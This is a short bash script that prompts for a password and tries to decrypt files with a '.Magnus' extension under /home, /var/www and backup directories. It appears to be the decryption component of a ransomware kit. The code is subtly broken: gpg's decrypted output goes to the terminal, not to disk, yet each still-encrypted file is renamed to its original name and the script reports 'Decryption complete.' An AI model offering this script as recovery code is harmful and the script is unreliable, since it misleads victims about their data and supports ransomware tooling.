#!/bin/bash

if ! [ -x "$(command -v gpg)" ]; then
  echo 'Error: gpg is not installed. Please install gpg and run the script again.'
  exit 1
fi

read -p "Enter the decryption password: " password

target_dir_1="/home"
target_dir_2="/var/www"
target_dir_3="/home/backups"
target_dir_4="/var/backups"

for file in $(find $target_dir_1 $target_dir_2 $target_dir_3 $target_dir_4 -type f -name "*.Magnus"); do

    echo "$password" | gpg --batch --yes --passphrase-fd 0 --decrypt "$file"

    mv "$file" "${file%.Magnus}"
done

echo "Decryption complete. Your files should now be accessible."
